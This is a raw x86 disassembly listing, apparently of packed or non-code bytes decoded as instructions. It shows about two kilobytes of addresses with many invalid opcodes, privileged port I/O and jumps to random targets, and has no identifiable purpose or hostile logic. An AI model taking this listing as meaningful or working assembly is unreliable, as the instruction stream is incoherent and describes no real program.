  4167ef:	call   0x2760:0x12b59c5b
  4167f6:	je     0x41683c
  4167f8:	add    BYTE PTR [esi+0x452218c1],al
  4167fe:	outs   dx,BYTE PTR ds:[esi]
  4167ff:	test   cl,dh
  416801:	dec    esi
  416802:	adc    BYTE PTR [esi-0x158febb7],cl
  416808:	retf   
  416809:	fmul   st,st(4)
  41680b:	sub    BYTE PTR [ebx],0x8d
  41680e:	cmp    BYTE PTR [ecx+0x5f],dl
  416811:	lods   eax,DWORD PTR ds:[esi]
  416812:	inc    esp
  416813:	(bad)  
  416814:	fstp   TBYTE PTR [edi+edi*4-0x61]
  416818:	out    0xf1,al
  41681a:	xor    BYTE PTR [edi+0xe],al
  41681d:	ja     0x4167f8
  41681f:	idiv   dh
  416821:	sbb    al,0x59
  416823:	dec    eax
  416824:	xacquire xchg DWORD PTR [esi],ecx
  416827:	adc    al,0x8
  416829:	(bad)  
  41682a:	jp     0x416834
  41682c:	test   BYTE PTR [ecx+0x2b],0x4e
  416830:	in     al,dx
  416831:	jnp    0x4167e5
  416833:	cmp    eax,0xc73e056c
  416838:	(bad)  
  416839:	fiadd  WORD PTR [eax-0x56]
  41683c:	xchg   esi,eax
  41683d:	neg    BYTE PTR [edi+edx*1]
  416840:	cmp    al,BYTE PTR [edi-0x5ad5fcf6]
  416846:	pop    edx
  416847:	xchg   edx,eax
  416848:	dec    edx
  416849:	arpl   WORD PTR [esi+0x26a404cb],sp
  41684f:	and    eax,0xa90f4307
  416854:	fisubr WORD PTR [edi]
  416856:	inc    ebp
  416857:	sbb    bl,al
  416859:	retf   0x49aa
  41685c:	(bad)  
  41685d:	push   esi
  41685e:	or     DWORD PTR [eax+0x1e],edi
  416861:	sub    eax,edx
  416863:	xor    al,0x52
  416865:	mov    ebx,0x14e46c69
  41686a:	(bad)  
  41686b:	xchg   edx,eax
  41686c:	adc    edx,DWORD PTR [esi-0x34]
  41686f:	shr    BYTE PTR [ebx],cl
  416871:	jbe    0x41680b
  416873:	ret    
  416874:	ins    BYTE PTR es:[edi],dx
  416875:	rol    DWORD PTR [edi-0x64305c68],cl
  41687b:	xchg   ecx,eax
  41687c:	push   edi
  41687d:	(bad)  
  41687e:	push   ds
  41687f:	pop    ebp
  416880:	adc    dl,BYTE PTR [ebp-0xc]
  416883:	dec    ebx
  416884:	es call 0x389cc203
  41688a:	ss xchg edx,eax
  41688c:	mov    al,BYTE PTR [ebx+0x6c89bfec]
  416892:	retf   
  416893:	add    eax,0xd64c2112
  416898:	cmp    al,0x62
  41689a:	dec    esi
  41689b:	sbb    BYTE PTR [edx],al
  41689d:	inc    ecx
  41689e:	sub    ebp,DWORD PTR [edx-0x7d]
  4168a1:	dec    edx
  4168a2:	mov    ecx,0xe3afafbe
  4168a7:	call   0x42153c88
  4168ac:	mov    dl,0x96
  4168ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168af:	ret    0x2689
  4168b2:	mov    dl,0xf8
  4168b4:	fnsave [edi+0x5845f80a]
  4168ba:	mov    gs,WORD PTR [ebp-0x6f]
  4168bd:	out    dx,eax
  4168be:	push   ss
  4168bf:	push   ds
  4168c0:	pop    ebx
  4168c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168c2:	call   0xfbb27efc
  4168c7:	call   0x9621:0xf4818959
  4168ce:	rol    BYTE PTR [eax+0x529306b6],cl
  4168d4:	push   edx
  4168d5:	mov    bl,0xb
  4168d7:	dec    esi
  4168d8:	cld    
  4168d9:	push   ss
  4168da:	mov    al,BYTE PTR ds:0x6946e55
  4168e0:	addr16 into 
  4168e2:	je     0x41687d
  4168e4:	dec    eax
  4168e5:	ror    BYTE PTR [ecx+edx*1],0xfc
  4168e9:	add    eax,0x18a3a265
  4168ee:	push   esp
  4168ef:	mov    esi,0x31a88b9
  4168f4:	cli    
  4168f5:	adc    ah,BYTE PTR [ebp+0x11813adf]
  4168fb:	mov    DWORD PTR [ebx+0x9],eax
  4168fe:	mov    eax,0x64a52680
  416903:	outs   dx,DWORD PTR ds:[esi]
  416904:	stos   DWORD PTR es:[edi],eax
  416905:	and    DWORD PTR [esi-0x5b],ebp
  416908:	icebp  
  416909:	pop    edx
  41690a:	xchg   ebp,eax
  41690b:	stc    
  41690c:	cmp    al,0xff
  41690e:	sbb    eax,0xf86ceeb
  416913:	dec    eax
  416914:	add    bh,BYTE PTR [esi+0x69]
  416917:	cdq    
  416918:	cmp    esi,ebp
  41691a:	mov    ds:0x9b9ee20b,al
  41691f:	jp     0x416983
  416921:	jle    0x4168ce
  416923:	icebp  
  416924:	xchg   ecx,eax
  416925:	test   eax,0x148572e
  41692a:	mov    al,ds:0xe9033978
  41692f:	xor    bl,dh
  416931:	fcmovnbe st,st(7)
  416933:	mov    eax,ds:0xb288bf56
  416938:	fucom  st(4)
  41693a:	rcl    ebp,1
  41693c:	ds scas al,BYTE PTR es:[edi]
  41693e:	mov    ebx,0x9df3531c
  416943:	mov    ds:0x3219b75d,al
  416948:	int3   
  416949:	pop    esp
  41694a:	icebp  
  41694b:	jp     0x416931
  41694d:	jne    0x41699d
  41694f:	bound  esp,QWORD PTR [eax]
  416951:	mov    edx,0x88ce70a2
  416956:	jnp    0x4168ea
  416958:	shl    BYTE PTR [ecx+edi*1-0x6288d21f],0x54
  416960:	mov    bh,0x65
  416962:	add    BYTE PTR [edi+0x5f],dl
  416965:	mov    edx,0xb5503a86
  41696a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41696b:	shl    BYTE PTR [edi+0x3b],0xa1
  41696f:	fcomip st,st(5)
  416971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416972:	es pop edi
  416974:	mov    esi,0xd09b784d
  416979:	and    al,0x6e
  41697b:	out    dx,al
  41697c:	sub    ecx,DWORD PTR [edi+ecx*8]
  41697f:	outs   dx,BYTE PTR ds:[esi]
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	adc    DWORD PTR [edx],edx
  416995:	push   esi
  416996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x7e70707e
  4169a0:	mov    dh,0xa9
  4169a2:	lds    ebp,FWORD PTR [ecx-0x77]
  4169a5:	jle    0x416983
  4169a7:	outs   dx,DWORD PTR ds:[esi]
  4169a8:	inc    ebx
  4169a9:	adc    DWORD PTR [edi+0x4e5ad65a],ecx
  4169af:	pop    ds
  4169b0:	push   esp
  4169b1:	lds    edi,FWORD PTR [edi]
  4169b3:	xchg   edi,eax
  4169b4:	es push esi
  4169b6:	fild   WORD PTR [ecx+0x2b]
  4169ba:	inc    ecx
  4169bb:	push   edi
  4169bc:	xlat   BYTE PTR ds:[ebx]
  4169bd:	push   0x408beb62
  4169c2:	sbb    DWORD PTR [ebp+ebx*4+0x32bf9317],edi
  4169c9:	push   cs
  4169ca:	enter  0xc38f,0x31
  4169ce:	addr16 inc esp
  4169d0:	adc    DWORD PTR [ebp-0x6fcfbfb2],0xffffff93
  4169d7:	repz mov ah,BYTE PTR [ebp-0xbb24fca]
  4169de:	iret   
  4169df:	dec    esi
  4169e0:	jp     0x416a5e
  4169e2:	jmp    0x164183af
  4169e7:	sub    BYTE PTR [edx+0x2a8b1065],ah
  4169ed:	std    
  4169ee:	fdiv   DWORD PTR [esi+0x63]
  4169f1:	in     al,0xfa
  4169f3:	add    ch,BYTE PTR ds:0x54200c53
  4169f9:	fnsave [edi]
  4169fb:	out    dx,eax
  4169fc:	and    DWORD PTR [edx+0x1e098536],edx
  416a02:	loopne 0x41698e
  416a04:	cdq    
  416a05:	add    eax,DWORD PTR [ebx-0x44365a88]
  416a0b:	lock imul ebp,esi,0xa795ebaf
  416a12:	cli    
  416a13:	int3   
  416a14:	rcl    DWORD PTR [ebx-0x70],cl
  416a17:	cmp    al,cl
  416a19:	mov    WORD PTR [edx+0x6a],ss
  416a1c:	add    al,0xc
  416a1e:	adc    ah,bh
  416a20:	or     cl,bl
  416a22:	add    eax,0xc640c85
  416a27:	test   eax,0xfdf2a23f
  416a2c:	cdq    
  416a2d:	jne    0x4169e3
  416a2f:	sbb    esi,esi
  416a31:	imul   esi,DWORD PTR [ecx+0x4e],0x2253791f
  416a38:	xchg   esi,eax
  416a39:	and    BYTE PTR [edx],0xc6
  416a3c:	dec    eax
  416a3d:	fcomp  DWORD PTR [esi]
  416a3f:	ins    DWORD PTR es:[edi],dx
  416a40:	mov    eax,ds:0x18590b38
  416a45:	push   ecx
  416a46:	jmp    0x6d2a:0x3f2bcde1
  416a4d:	or     eax,0x433955b
  416a52:	xor    eax,0xa44bf179
  416a57:	dec    edi
  416a58:	adc    BYTE PTR [edx-0x16],ah
  416a5b:	push   edx
  416a5c:	xlat   BYTE PTR ds:[ebx]
  416a5d:	sub    BYTE PTR [ebp-0x14],bl
  416a60:	pop    esi
  416a61:	mov    edi,0xffd76688
  416a66:	adc    ch,BYTE PTR cs:[edi-0x5e43f15e]
  416a6d:	div    esi
  416a6f:	mov    ch,0x29
  416a72:	sub    dh,ch
  416a74:	mov    ecx,0x31aa4aa4
  416a79:	lock pop edi
  416a7b:	jl     0x416af7
  416a7d:	enter  0x964f,0x77
  416a81:	imul   esp,ebp,0x11e8a426
  416a87:	inc    ecx
  416a88:	sbb    eax,0x8bea466d
  416a8d:	mov    esi,0x3cc64e29
  416a92:	xchg   DWORD PTR [edx-0x11],ecx
  416a95:	jns    0x416a64
  416a97:	loop   0x416a21
  416a99:	scas   eax,DWORD PTR es:[edi]
  416a9a:	hlt    
  416a9b:	push   cs
  416a9c:	fsubr  DWORD PTR [ecx+0x15]
  416a9f:	inc    esp
  416aa0:	push   cs
  416aa1:	imul   eax,DWORD PTR [edi+0x230b9881],0x2e
  416aa8:	enter  0xee76,0xf5
  416aac:	pop    ecx
  416aad:	cli    
  416aae:	mov    ch,0x6
  416ab0:	call   0x95f84f4f
  416ab5:	mov    edi,DWORD PTR [eax+0xea82c3]
  416abb:	and    esi,DWORD PTR cs:[ecx-0x77a158e0]
  416ac2:	xchg   edi,eax
  416ac3:	add    ah,BYTE PTR [ebp-0x177b14d6]
  416ac9:	xor    ch,dh
  416acb:	jne    0x416a60
  416acd:	jo     0x416a59
  416acf:	test   BYTE PTR [edi-0xe],ch
  416ad2:	add    edi,eax
  416ad4:	sbb    ecx,edx
  416ad6:	mov    cl,0xbc
  416ad8:	inc    ebp
  416ad9:	addr16 mov dl,0xd0
  416adc:	mov    ecx,0x983ad3a2
  416ae1:	ret    
  416ae2:	repz mov esi,0x5afa9adb
  416ae8:	xchg   edi,eax
  416ae9:	dec    eax
  416aea:	push   ss
  416aeb:	cwde   
  416aec:	xchg   ecx,eax
  416aed:	dec    ebx
  416aee:	pop    ds
  416aef:	xlat   BYTE PTR ds:[ebx]
  416af0:	sahf   
  416af1:	add    al,0xec
  416af3:	xchg   DWORD PTR [edi+0x6a],ecx
  416af6:	out    0xe5,eax
  416af8:	xlat   BYTE PTR ds:[ebx]
  416af9:	clc    
  416afa:	xlat   BYTE PTR ds:[ebx]
  416afb:	arpl   WORD PTR [edx],bp
  416afd:	(bad)  
  416aff:	enter  0xf0d6,0x43
  416b03:	outs   dx,DWORD PTR ds:[esi]
  416b04:	push   esi
  416b05:	push   ecx
  416b06:	das    
  416b07:	xor    ebx,DWORD PTR [ecx-0x49]
  416b0a:	or     edx,ecx
  416b0c:	fadd   QWORD PTR [edx+0xb36f0bf]
  416b12:	push   esi
  416b13:	mov    al,0xe3
  416b15:	push   ecx
  416b16:	leave  
  416b17:	popf   
  416b18:	dec    ebp
  416b19:	sbb    bl,ah
  416b1b:	jb     0x416aea
  416b1d:	ss pushf 
  416b1f:	cs inc edx
  416b21:	inc    edi
  416b22:	fwait
  416b23:	jno    0x416b23
  416b25:	sbb    dh,BYTE PTR [edi+ebx*8+0x3e]
  416b29:	stos   DWORD PTR es:[edi],eax
  416b2a:	cmp    BYTE PTR [edi],bh
  416b2c:	xchg   BYTE PTR [edi-0x27],bl
  416b2f:	fild   QWORD PTR [ebx]
  416b31:	or     BYTE PTR [edx+0x68],0x3a
  416b35:	xchg   esp,eax
  416b36:	stc    
  416b37:	sub    BYTE PTR [ebx+ebx*8-0x1cc140b9],dl
  416b3e:	scas   al,BYTE PTR es:[edi]
  416b3f:	xor    ebx,eax
  416b41:	xchg   ecx,eax
  416b42:	push   ecx
  416b43:	mov    ss,ebx
  416b45:	jmp    0x416ad1
  416b47:	rcr    BYTE PTR [eax+0x7ab45e99],cl
  416b4d:	cld    
  416b4e:	inc    esi
  416b4f:	in     al,0xc3
  416b51:	mov    ch,0x24
  416b53:	push   ebx
  416b54:	rol    BYTE PTR [ebx],cl
  416b56:	jg     0x416ae8
  416b58:	mov    WORD PTR [edi],cs
  416b5a:	push   esp
  416b5b:	or     BYTE PTR [ebx-0xc30aeaf],dh
  416b61:	inc    esp
  416b62:	or     ebx,eax
  416b64:	shr    edi,0x38
  416b67:	lods   al,BYTE PTR ds:[esi]
  416b68:	ret    0xd9df
  416b6b:	fstp   TBYTE PTR [edx+0x86ea092]
  416b71:	inc    edx
  416b72:	add    dh,BYTE PTR [ecx]
  416b74:	xlat   BYTE PTR ds:[ebx]
  416b75:	fwait
  416b76:	jb     0x416b65
  416b78:	cdq    
  416b79:	hlt    
  416b7a:	xchg   ebp,eax
  416b7b:	pop    ebx
  416b7c:	mov    ds:0x9e561ae2,al
  416b81:	into   
  416b82:	ret    0x6829
  416b85:	aas    
  416b86:	les    ebx,FWORD PTR [ebx]
  416b88:	pop    eax
  416b89:	test   eax,0xfe3a8a1d
  416b8e:	das    
  416b8f:	ins    DWORD PTR es:[edi],dx
  416b90:	mov    edi,0xb0b2b8f1
  416b95:	mov    al,0x68
  416b97:	push   ds
  416b98:	lock jecxz 0x416b78
  416b9b:	fstp   DWORD PTR ds:0xdb858062
  416ba1:	in     al,dx
  416ba2:	daa    
  416ba3:	in     eax,0xf8
  416ba5:	cmp    eax,0x739d0022
  416baa:	xchg   ecx,eax
  416bab:	mov    ss,WORD PTR [ecx]
  416bad:	add    edi,eax
  416baf:	mov    ss,WORD PTR [edx]
  416bb1:	lahf   
  416bb2:	xchg   ebx,eax
  416bb3:	xor    al,0xb0
  416bb5:	js     0x416bd1
  416bb7:	retf   
  416bb8:	or     edi,ecx
  416bba:	ins    BYTE PTR es:[edi],dx
  416bbb:	xchg   ecx,eax
  416bbc:	and    edx,eax
  416bbe:	mov    DWORD PTR ds:0xcd96bacb,ebx
  416bc4:	popf   
  416bc5:	loopne 0x416be5
  416bc7:	xor    BYTE PTR ds:0x351fc9ae,ah
  416bcd:	mov    ebx,0xe9209aa5
  416bd2:	mov    edx,0x90aa2bc2
  416bd7:	sahf   
  416bd8:	in     eax,dx
  416bd9:	jnp    0x416c5a
  416bdb:	imul   ebx,DWORD PTR [ecx],0x48
  416bde:	cmp    ecx,ebx
  416be0:	cmp    esi,DWORD PTR [ebx-0x75bdc0fb]
  416be6:	or     DWORD PTR [edx+0x35],0x68
  416bea:	mov    cl,0x87
  416bec:	enter  0x96d2,0x12
  416bf0:	sub    DWORD PTR [esi],esi
  416bf2:	pop    ss
  416bf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bf4:	cmp    BYTE PTR [ecx],ch
  416bf6:	cmp    BYTE PTR [edx+0x70],al
  416bf9:	cmc    
  416bfa:	cmc    
  416bfb:	or     eax,0x95413cea
  416c00:	es mov dh,0x9b
  416c03:	leave  
  416c04:	mov    ebx,0xcb9083fe
  416c09:	inc    esi
  416c0a:	in     eax,dx
  416c0b:	xor    BYTE PTR [ecx-0x1c],ah
  416c0e:	or     al,0x7b
  416c10:	dec    edi
  416c11:	ins    DWORD PTR es:[edi],dx
  416c12:	pushf  
  416c13:	inc    eax
  416c14:	pop    edx
  416c15:	jb     0x416c7e
  416c17:	in     eax,0xff
  416c19:	inc    edx
  416c1a:	xchg   ebp,eax
  416c1b:	and    eax,0x8a33eeeb
  416c20:	sbb    dl,BYTE PTR [edx]
  416c22:	fsqrt  
  416c24:	add    eax,edx
  416c26:	call   0x5f190442
  416c2b:	jb     0x416c45
  416c2d:	outs   dx,BYTE PTR ds:[esi]
  416c2e:	daa    
  416c2f:	or     BYTE PTR [eax],0x39
  416c32:	enter  0x401,0x2a
  416c36:	fsub   DWORD PTR [edx+0x173b619c]
  416c3c:	lea    esp,[ecx+esi*1]
  416c3f:	sbb    BYTE PTR [ebx-0x446e1d8c],bl
  416c45:	clc    
  416c46:	aas    
  416c47:	pop    ecx
  416c48:	cmp    al,0x5b
  416c4a:	adc    al,0xd7
  416c4c:	adc    DWORD PTR [ebx+0x50],esi
  416c4f:	mov    al,0xd3
  416c51:	je     0x416be2
  416c53:	push   esp
  416c54:	or     ebp,ecx
  416c56:	mov    ds:0xe08d1426,al
  416c5b:	shr    BYTE PTR [ebx],1
  416c5d:	pushf  
  416c5e:	clc    
  416c5f:	loop   0x416c8c
  416c61:	adc    edx,DWORD PTR [ebx+ebx*8-0x7]
  416c65:	mov    cl,0x49
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	jle    0x416c0e
  416c7d:	push   ds
  416c7e:	std    
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416ce5
  416c88:	cdq    
  416c89:	pop    ebp
  416c8a:	js     0x416c23
  416c8c:	adc    bh,BYTE PTR ds:0x5f3faf07
  416c92:	(bad)  
  416c93:	icebp  
  416c94:	shl    bh,cl
  416c96:	sub    ebp,esp
  416c98:	jno    0x416c80
  416c9a:	rcr    DWORD PTR [esi-0x23],1
  416c9d:	jne    0x416d13
  416c9f:	scas   al,BYTE PTR es:[edi]
  416ca0:	inc    esi
  416ca1:	sub    esi,esi
  416ca3:	mov    WORD PTR ds:0x4a392aa8,gs
  416ca9:	mov    edi,0x3a6a8d45
  416cae:	dec    esi
  416caf:	mov    dh,0x78
  416cb1:	inc    edi
  416cb2:	xor    ebx,DWORD PTR [ebp+0x71]
  416cb5:	xchg   ebp,eax
  416cb6:	loop   0x416c93
  416cb8:	mov    bh,0xff
  416cba:	imul   ebx,DWORD PTR [edi-0x245db45e],0xfffffff0
  416cc1:	(bad)  
  416cc2:	add    BYTE PTR [edi+esi*8-0x53293540],ah
  416cc9:	lock adc esi,ebx
  416ccc:	fldenv [ebx+0x5]
  416ccf:	xchg   esi,eax
  416cd0:	jns    0x416d00
  416cd2:	adc    eax,0x93e12bf1
  416cd7:	imul   ecx,DWORD PTR [ecx+0x2c9eb5fe],0xbf947e02
  416ce1:	sbb    bl,BYTE PTR [edx*4-0x2d92021e]
  416ce8:	(bad)  
  416ce9:	or     al,0x9f
  416ceb:	rcr    BYTE PTR [ebx],cl
  416ced:	mov    esi,0xbe3c70c7
  416cf2:	cmc    
  416cf3:	xor    ecx,DWORD PTR [edx]
  416cf5:	fist   WORD PTR [ecx+0x14]
  416cf8:	ins    DWORD PTR es:[edi],dx
  416cf9:	adc    BYTE PTR [ecx+ebp*8-0x3b70fb],bl
  416d00:	inc    ebp
  416d01:	push   edi
  416d02:	push   edx
  416d03:	pop    ds
  416d04:	scas   al,BYTE PTR es:[edi]
  416d05:	lahf   
  416d06:	pop    ebx
  416d07:	ds cmp eax,0xa6d0c5e4
  416d0d:	or     eax,0x6a369a0d
  416d12:	in     al,0xf5
  416d14:	add    edi,DWORD PTR [esi+0x2b]
  416d17:	je     0x416d65
  416d19:	sbb    BYTE PTR [ebx+edx*1-0x40],ch
  416d1d:	adc    ch,ch
  416d1f:	jbe    0x416d12
  416d21:	sub    eax,0xcad0738d
  416d26:	leave  
  416d27:	push   ds
  416d28:	(bad)  
  416d29:	xor    al,0x57
  416d2b:	addr16 mov bh,0x33
  416d2e:	pop    ecx
  416d2f:	(bad)  
  416d30:	stos   BYTE PTR es:[edi],al
  416d31:	cmp    DWORD PTR [edi-0x36],edx
  416d34:	pop    ss
  416d35:	in     eax,dx
  416d36:	push   cs
  416d37:	ret    0xe307
  416d3a:	inc    edi
  416d3b:	retf   0xd32
  416d3e:	jns    0x416d06
  416d40:	cmp    eax,0x403fbe57
  416d45:	dec    ecx
  416d46:	repnz lahf 
  416d48:	xor    eax,0xecb7b897
  416d4d:	jp     0x416cf6
  416d4f:	xor    bh,BYTE PTR [ebp+0x5767aee0]
  416d55:	in     al,0xf2
  416d57:	jbe    0x416ce5
  416d59:	xor    dl,BYTE PTR [eax+0x77079db0]
  416d5f:	jnp    0x416d3e
  416d61:	pushf  
  416d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d63:	cli    
  416d64:	push   ebp
  416d65:	lahf   
  416d66:	test   BYTE PTR [esi-0x4a2e7b3a],al
  416d6c:	sbb    BYTE PTR [ebx],dl
  416d6e:	in     al,0xab
  416d70:	cmp    dh,BYTE PTR [edi]
  416d72:	sbb    edi,DWORD PTR [ebp-0x5272748]
  416d78:	and    BYTE PTR [edx+0x59],cl
  416d7b:	push   0x659ad7ea
  416d80:	ins    DWORD PTR es:[edi],dx
  416d81:	shl    ecx,1
  416d83:	xlat   BYTE PTR ds:[ebx]
  416d84:	and    eax,0x3875cbca
  416d89:	mov    esi,0xc7401fee
  416d8e:	out    dx,al
  416d8f:	fwait
  416d90:	repz shl DWORD PTR [edi+ecx*1],1
  416d94:	fisubr DWORD PTR [ebp-0x3a076b9e]
  416d9a:	xor    BYTE PTR [ecx],0xdb
  416d9d:	pop    ebx
  416d9e:	cmp    bh,ah
  416da0:	adc    eax,0xdf244d82
  416da5:	fwait
  416da6:	jmp    0x416d78
  416da8:	out    0x72,al
  416daa:	jp     0x416d5c
  416dac:	push   ss
  416dad:	adc    al,0xcf
  416daf:	cs cli 
  416db1:	push   ebx
  416db2:	gs stos DWORD PTR es:[edi],eax
  416db4:	mov    ch,0x8d
  416db6:	push   ebx
  416db7:	test   al,0x14
  416db9:	push   ecx
  416dba:	pop    ebp
  416dbb:	add    eax,0xc20a1b0
  416dc0:	(bad)  
  416dc1:	out    0x73,eax
  416dc3:	mov    edx,0x67649939
  416dc8:	es add al,0x97
  416dcb:	sti    
  416dcc:	push   esp
  416dcd:	leave  
  416dce:	sbb    al,0xa9
  416dd0:	pusha  
  416dd1:	jle    0x416d7e
  416dd3:	outs   dx,DWORD PTR ds:[esi]
  416dd4:	dec    eax
  416dd5:	add    BYTE PTR [ebx],dl
  416dd7:	cdq    
  416dd8:	call   0xbfba0811
  416ddd:	or     eax,0x71d3c321
  416de2:	and    esp,DWORD PTR [ecx-0xa055a49]
  416de8:	ins    BYTE PTR es:[edi],dx
  416de9:	fcomp  DWORD PTR [edi]
  416deb:	les    eax,FWORD PTR [edi+0x47]
  416dee:	xchg   ecx,eax
  416def:	and    ch,BYTE PTR [esi+0x64]
  416df2:	mov    dl,0x63
  416df4:	inc    esi
  416df5:	je     0x416dc9
  416df7:	dec    ebp
  416df8:	or     DWORD PTR [ebp+0x6379529c],0x5ffa4866
  416e02:	icebp  
  416e03:	sbb    al,0x23
  416e05:	jl     0x416dfd
  416e07:	push   0xffffffc2
  416e09:	mov    edi,0x4095e54e
  416e0e:	pop    edx
  416e0f:	xor    eax,0x63aa63ce
  416e14:	clc    
  416e15:	dec    esi
  416e16:	mov    WORD PTR [edx],fs
  416e18:	mov    esp,0x43351de0
  416e1d:	fmul   DWORD PTR [ebx-0x49]
  416e20:	or     bh,al
  416e22:	lods   al,BYTE PTR ds:[esi]
  416e23:	in     eax,dx
  416e24:	add    ah,bh
  416e26:	sub    cl,ch
  416e28:	aam    0x1a
  416e2a:	stos   BYTE PTR es:[edi],al
  416e2b:	inc    edx
  416e2c:	sub    DWORD PTR [ecx],eax
  416e2e:	xor    DWORD PTR [edi],esp
  416e30:	in     eax,0xce
  416e32:	into   
  416e33:	mov    ds:0xb714a5a5,al
  416e38:	(bad)  
  416e39:	or     eax,0x76ed7d8b
  416e3e:	loopne 0x416e9c
  416e40:	js     0x416e7a
  416e42:	lea    edi,[esi+0x7a174f63]
  416e48:	cmp    eax,0x6df3be6b
  416e4d:	nop
  416e4e:	dec    esi
  416e4f:	dec    eax
  416e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e51:	aam    0x34
  416e53:	es or  al,0x1f
  416e56:	rcl    DWORD PTR [eax-0x61],1
  416e59:	or     ch,BYTE PTR [ebx]
  416e5b:	mov    ds:0xdca328f5,eax
  416e60:	scas   al,BYTE PTR es:[edi]
  416e61:	jge    0x416df5
  416e63:	cwde   
  416e64:	iret   
  416e65:	fs jns 0x416def
  416e68:	scas   eax,DWORD PTR es:[edi]
  416e69:	stos   DWORD PTR es:[edi],eax
  416e6a:	push   esi
  416e6b:	pop    esi
  416e6c:	jmp    FWORD PTR [edi+0x58]
  416e6f:	sbb    eax,DWORD PTR [edx-0x2bf941d1]
  416e75:	mov    dh,0xdb
  416e77:	mov    ecx,0x17fb0dca
  416e7c:	dec    eax
  416e7d:	or     DWORD PTR [eax],esp
  416e7f:	dec    esp
  416e80:	je     0x416e6c
  416e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e83:	in     eax,0x3b
  416e85:	daa    
  416e86:	pop    es
  416e87:	(bad)  
  416e88:	mov    ch,0xd8
  416e8a:	push   ss
  416e8b:	out    0x6,al
  416e8d:	mov    eax,ds:0x80ac4983
  416e92:	retf   
  416e93:	lds    eax,FWORD PTR [ecx+eiz*1-0x4a64bd46]
  416e9a:	push   ebx
  416e9b:	push   esi
  416e9c:	xor    al,0xbd
  416e9e:	pop    edx
  416e9f:	inc    esi
  416ea0:	fwait
  416ea1:	add    ah,BYTE PTR [ecx-0x67755bb4]
  416ea7:	imul   esp,edx,0x5a8ab5dd
  416ead:	iret   
  416eae:	(bad)  
  416eb0:	into   
  416eb1:	inc    edi
  416eb2:	not    DWORD PTR [ebp-0x2c]
  416eb5:	sub    al,0x69
  416eb7:	jno    0x416e96
  416eb9:	je     0x416e85
  416ebb:	mov    DWORD PTR [ebp+ebx*1+0x66ff471],ebx
  416ec2:	neg    DWORD PTR [esp+eax*1]
  416ec5:	sti    
  416ec6:	data16 mov ?,WORD PTR ds:0x45220a0d
  416ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ece:	jae    0x416e71
  416ed0:	cdq    
  416ed1:	sti    
  416ed2:	loop   0x416f3d
  416ed4:	mov    ecx,0xd8f49d1b
  416ed9:	enter  0x5ff7,0x65
  416edd:	repz (bad) 
  416edf:	enter  0x83d9,0x52
  416ee3:	add    ebx,DWORD PTR [edx]
  416ee5:	push   esi
  416ee6:	shl    BYTE PTR [ecx+0x43ab746],1
  416eec:	add    DWORD PTR [ebx],ebx
  416eee:	xchg   esi,eax
  416eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ef1:	retf   
  416ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ef3:	mov    esi,0xc62da0ee
  416ef8:	lea    ebx,[eax]
  416efa:	scas   al,BYTE PTR es:[edi]
  416efb:	loopne 0x416eec
  416efd:	(bad)  
  416efe:	xor    ecx,DWORD PTR [ebx+esi*8-0x2d]
  416f02:	jg     0x416ee4
  416f04:	repz inc ebx
  416f06:	sub    al,0xa
  416f08:	cmp    BYTE PTR [eax-0x37],0xe5
  416f0c:	pop    es
  416f0d:	and    DWORD PTR [ebx+0x654ebeac],edi
  416f13:	pop    eax
  416f14:	sub    eax,DWORD PTR [ebp-0x5a]
  416f17:	aaa    
  416f18:	mov    ebx,0x7458502
  416f1d:	jmp    ebp
  416f1f:	push   cs
  416f20:	xor    eax,esp
  416f22:	out    dx,eax
  416f23:	jae    0x416f8b
  416f25:	fidivr WORD PTR [ebx]
  416f27:	ds jne 0x416f8d
  416f2a:	std    
  416f2b:	cmp    DWORD PTR [eax-0x41a56816],0xffffff99
  416f32:	push   ebp
  416f33:	jnp    0x416fb3
  416f35:	imul   esp,DWORD PTR [ebx-0x43801458],0x90baccce
  416f3f:	inc    edx
  416f40:	retf   
  416f41:	mov    cl,0x33
  416f43:	push   ds
  416f44:	pop    si
  416f46:	adc    al,0xc0
  416f48:	loop   0x416f57
  416f4a:	jmp    0x416f55
  416f4c:	lods   al,BYTE PTR ds:[esi]
  416f4d:	and    al,0xf
  416f4f:	scas   eax,DWORD PTR es:[edi]
  416f50:	rol    DWORD PTR [ebx],0xe0
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	stos   DWORD PTR es:[edi],eax
  416f6b:	retf   
  416f6c:	ja     0x416f48
  416f6e:	aaa    
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0xa670707e
  416f77:	adc    al,0xe2
  416f79:	sub    eax,DWORD PTR [esi]
